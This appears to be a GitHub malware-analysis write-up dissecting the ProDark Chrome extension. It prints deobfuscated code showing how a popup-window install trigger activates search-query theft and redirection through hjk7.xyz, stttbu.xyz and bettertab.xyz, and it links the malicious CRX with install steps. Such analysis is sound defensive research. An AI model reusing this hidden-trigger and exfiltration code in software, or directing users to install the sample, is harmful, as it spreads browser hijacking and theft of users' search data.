![image](https://github.com/user-attachments/assets/4a35911f-2973-49bc-a5c8-8a1fea340c75)

# Description
In this reverse engineering analysis, we'll investigate the ProDark Chrome extension, which claims to provide a simple dark mode for websites. By dissecting its CRX file and analyzing it's key components, we'll uncover the obfuscated code designed to hide its **true malicious capabilities**, triggered only under specific conditions. The extension can redirect user search queries through external domains, manipulates Tabs and alters DOM elements on the webpage. This analysis sheds light on the sophisticated techniques used by malicious Chrome extensions to bypass detection while monetizing unsuspecting users browsing activity.

# Benign Usage
In its default usage, the ProDark Chrome extension functions as a simple tool to toggle dark mode on web pages. When activated, it changes the background to black and text to white, providing a basic dark theme for easier viewing. 
It achieves that by leveraging its content.js script, which runs on every web page the user visits. This script listens for messages from the extension's background.js script to toggle dark mode. When triggered, it manipulates the DOM by altering the background-color property of page elements to black and the color property of text elements to white. 
This functionality appears straightforward, with the extension responding to user actions through its content script to apply or remove dark mode across different sites.

![image](https://github.com/user-attachments/assets/c59cf856-8327-4f98-af29-ca4b4b8d1db8)
![image](https://github.com/user-attachments/assets/83494913-dcba-45a5-af99-8e6598b2113f)

# Installation
Since the extension was removed from the chrome webstore, i've included the .crx file for download and installation.
1. Download the CRX file - [ProDark.crx](ProDark.crx)
2. Open chrome://extensions/ in your browser
3. Upload the file directly

# CRX File
When extracting the CRX file ([ProDark.zip](ProDark.zip)), we see it contains the following files: 
- manifest.json
- content.js
- background.js
- _metadata (folder)
- logo.png  

> **manifest.json** - This file outlines the metadata of the extension. It declares the name "ProDark", its purpose (providing dark mode for simple pages), and the associated background script (background.js) and content script (content.js). It also lists the **permissions for storage and tabs**.  

> **content.js** - This script runs on every web page and applies the dark mode functionality. It changes the background color to black and the text color to white. It listens for messages to toggle dark mode and can reset the background color depending on specific conditions.  

> **background.js** - This file manages background processes, including the extension's behavior when the user clicks on the icon. It also contains functions for converting and manipulating color values, along with event listeners for toggling the extension's badge and sending messages to content scripts.  

> **_metadata** - This folder which contains the verified_contents.json file, is part of Chrome’s security framework to ensure the authenticity and integrity of extensions distributed through its Web Store.  

> **logo.png** - contains the extension’s icon logo.

From this general overview, we can see that the extension requests the storage and tabs permissions, and contains a substantial background.js file with nearly 2,000 lines of code, which seem unusual for an extension that only claims to change colors.

# Code Analysis
After dissecting the Obfuscated javascript code we learn the following: 
apart from using the setLight and stopLight messages between the background.js and the content.js to switch between the background color to either black or original, the extension can do a few extra things which all depend on one API call, the “chrome.runtime.onInstalled”:
```javascript
chrome.runtime.onInstalled.addListener(function (e) {
	if("install" === e.reason)
		chrome.windows.getAll({populate: !0}, (tabs) => {
			var t;
			for (let j= 0; j <= tabs.length - 1; j++)
				tabs[j].type.includes(cobal("peachpuff", 5, 7)) &&
				(eu(), setTimeout(function () {
						darkerput(1800);
						chrome.tabs.create({url: "https://hjk7.xyz/ty?id=" + exid.split("").reverse().join("")})
						chrome.windows.remove(tabs[j].id, function () {
						});
					}, 1e3)
				)
		}), fetch(ty);
});
```
This will trigger the full capability of this extension. To better understand this, let's break down the call into a few key points:

1.	onInstalled.addListener sets up an event listener that triggers when the extension is either installed or updated, the if(“install” == e.reason) means the following will trigger only for when the extension is first installed.

2.	Chrome.windows.getAll - This line retrieves data from all open windows and their tabs.

3.	tabs[j].type.includes(cobal("peachpuff", 5, 7)) && - this condition will determine if the extension will run maliciously or not, since it has a &&, for the next few functions to run, this condition needs to be met.

  	cobal() is a string manipulation function, which with the provided string, it comes out as ‘pu’, tabs.type is the type of tab you have open, it can only be a few options: normal, popup, panel, app and devtools. 

**This means that for the extension to reveal its true behavior, a popup window needs to be open during the installation process.** 

## No Popup
When no popup windows are present, the extension will skip over the eu(), darkerput() and the tab creation and removal seen above. Because of that, the “initial” value which is stored inside the chrome.storage will not be defined as “default”:
![image](https://github.com/user-attachments/assets/a0ec0ef4-054e-45f6-bae8-8d3f5857ff98)

This means the variable “i” will remain undefined since “initial” != “default”:
```javascript
chrome.storage.local.get(["initalcolor"], function (s) {
	if (s.color === "default")
		i = true
});
```
leading to skipping the entire 370 lines of code after this “if” condition which is un-met:
```javascript
if (i == !0 && s == !1 && "loading" === tab.status && !colchk(cobal("Bhaclebstoc blue", 5, 10)))
```
This part of the code after the "if" condition, is in charge of the malicious activities it can preform, without it the extension performs like any other simple dark theme extension.

## With Popup
If one of the tabs is considered a popup, the rest of the code under the runtime.onInstalled runs: 

•	The function eu() is triggered, setting i = true, which will allow the code within the chrome.tabs.onUpdated.addListener (containing the if condition above)  
to be executed later.

•	A new tab is opened with the URL contructed by reversing the ‘exid’ meaning: 
```https://hjk7.xyz/ty?id=mhfalkcmmkajgecgcnaceipcoenh```

•	The tab containing the popup will close

•	The fetch command will trigger a request being made for an external domain.

From this point the following behavior can be seen when using a search engine: 

1.	Typing something in the search engine like google will trigger the chrome.tabs.onUpdated:
```javascript
chrome.tabs.onUpdated.addListener(function (tabid, status, tab) {
	tu = tab.url, colchk(exid) && !colchk("errors") && colos(tabid)
	function rgbConverthsl({ h, s, l, a = 1 }) {
		if (s === 0) {
			const [r, b, g] = [l, l, l].map((x) => Math.round(x * 255));
			return { r, g, b, a };
		}
```
2. 	The URL is checked if it contains the ‘exid’ and ‘errors’ strings, if it contains the ‘exid’ and not the ‘errors’, the tab will close (using the colos() function).

3.	It passes through the “if” condition we’ve talked about earlier (since “i” is now defined)
 

4.	The payload containing the search query is saved inside the “c” variable

5.	A new tab is opened and redirected to ```https://stttbu.xyz/ssc/pda?p={added payload}```
essentially meaning it uses a GET request to transfer my search query to an external domain

6.	We are then being redirected to this URL - ```https://www.bettertab.xyz/searchapi/redirect.aspx?q={added payload}&channel=2188
&pid=bbtab```

7.	To then being redirected a final time to bing.com - ```https://www.bing.com/search?q={added payload}```

8.	Once the process is finished, the original tab with the initial query for google.com is closed. (the entire process takes about 1.5-2 seconds)

9.	Before completing its process, it also creates an array using the “c” variable to store all the payloads we've inputted (essentially tracking my activity). Here’s an example after numerous searches:

![image](https://github.com/user-attachments/assets/33d8ab14-7822-4cef-8d81-9e85b0edfec3)

10. Last thing to mention besides the different delays it’s invoking, the extension sends the setLight message:  setTimeout(()=>chrome.tabs.sendMessage(e.id, {setLight: 1}), 5e3).
Inside the content.js it triggers the continueSetLight function: 
```javascript
function darkSet(request, sender, sendResponse) {
	if(request.setLight)
		continueSetLight(request, sender, sendResponse);
	if (request.stoplight) {
```
```javascript
function continueSetLight(request, sender, sendResponse) {
	document.getElementById('bg') && (document.getElementById('sb_feedback').style.backgroundColor = 'white')
	document.getElementById('bg') && (document.getElementById('bg').style.backgroundColor = 'white')
	document.getElementById('sb') && (document.getElementById('sb').style.backgroundColor = 'white')
	document.getElementById('fg') && (document.getElementById('fg').style.backgroundColor = 'white')
	document.getElementById('sb_feedback') && (document.getElementById('sb_feedback').style.display = 'none')
}
```
Besides enabling "Light Mode" and changing the background color of several DOM elements to white, it also hides the 'sb_feedback' element, which conceals a button on the bing.com page:

![image](https://github.com/user-attachments/assets/01912aa4-efb4-4315-850f-9802b074d39a)

![image](https://github.com/user-attachments/assets/e8a44342-3019-490d-9f3c-b30ed473d90b)

![image](https://github.com/user-attachments/assets/6b12edd3-3b24-4299-a587-9b314f9b612f)


## Example Process

1. ![image](https://github.com/user-attachments/assets/b9c59b22-94b9-4f7e-b92f-6d7ec25bbfca) searching something on Google
2. ![image](https://github.com/user-attachments/assets/90924973-1277-4644-9fe9-2d23647a99a8) new tab creation
3. ![image](https://github.com/user-attachments/assets/0c1432a5-e9df-43c4-8a55-4324d78031a5) Redirection 1
4. ![image](https://github.com/user-attachments/assets/5fcb1d71-f9e3-4f8d-8c65-fa1a32d72f4c) Redirection 2

When applying a search query the first domain requested is ```sttbu.xyz```:
![image](https://github.com/user-attachments/assets/195256e6-f1a1-46cc-b2c9-67b547e2f80f)

We can observe the payload (in this case “hello”) that I entered in the Google.com search bar being uploaded and transferred to this external domain through a GET parameter. Additionally, several types of cookies are being included, which are probably used for user profiling and session management and affiliate ID’s.

The second domain which im redirected to is ```www.bettertab.xyz```: 
Again we see my search query being transferred and some more cookie keys added: 
![image](https://github.com/user-attachments/assets/7137a310-8791-4788-bc25-f40a85a8bbdb)

To summarize, the extension is capable of the following actions:
* Tab manipulation 
* Unapproved HTTP requests to external domains / redirection
* Storing and exfiltration of search queries
* DOM manipulation

We can see the actor includes multiple protection methods to hide its real capabilities, 
most obviously is the usage of obfuscation throughout the code, variable names such as c,x,s,tu… are meant to to make it difficult for researchers and automated analysis tools to understand the logic behind it. 

Since the extension wants to appear as benign as possible, it needs to minimize any suspicious behavior. This likely explains the complicated requirement: a popup tab must be open during installation for the extension to activate its malicious functions, any other user will have a normal and legit experience.

We can also see the usage of chrome.storage to store the different search queries.
This is likely done to continue the data exfiltration and avoid deletion upon closing the browser (since the chrome.storage can bypass that and keep the data).

## Why this Trigger
After some research online, I found out that BetterTab is a known form of adware and browser hijacker, typically installed through other software bundels like extensions. 
It sets your default page as bettertab.com and hijacks your browser’s search engine by redirecting your search queries through their own engine - ```www.bettertab.xyz```, before landing on the final search page like Bing or Yahoo. We can even see it through debugging:

![image](https://github.com/user-attachments/assets/30944eed-4049-4b84-96a5-6967c38f2639)

Further research revealed that BetterTab is also bundled with another adware that generates 
pop-ups. With this program installed, whenever you browse the internet, an ad from ```try.thebettertab.com``` will randomly appear:
![image](https://github.com/user-attachments/assets/dc401a8a-2b68-48a9-adb2-ee302bb95521)

Clicking on this ad could be a way to trigger the ProDark extension download and since you already have a popup window open, the malicious capabilities will be enabled. 

https://malwaretips.com/blogs/remove-try-thebettertab-com/

# Possible Monetization Tactics
Bad actors often seek easy ways to cash in and monetize their attacks. In this case, they may use the following methods:

- **Affiliate Revenue** – As stated before, the BetterTab domain is a common browser hijacker which redirects traffic to other search engines, this is done to generate revenue by affiliate tracking. Each time BetterTab redirects a user, it includes unique affiliate IDs or tracking parameters (can be see in question 4 in the Burp request). These parameters ensure that any following clicks or purchases made by the user are attributed to the affiliate. In addition, there are also many affiliate-programs that earn cash through generating traffic for a specific domain.

- **Ad Fraud** - The domains ‘bettertab.xyz’ and ‘stttbu.xyz’ could contain ads which 
generate revenue through forced views or clicks. This is a common tactic in ad fraud, where the extension inflates traffic metrics (since the user visits the site in the redirection) and earn money from the advirtisers based on pay-per-view methods.

- **Data Harvesting** – The extension is seen collecting and logging my search queries and history during the redirection process, this data could be then sold to data brokers, 
ad companies, cyber criminals etc.















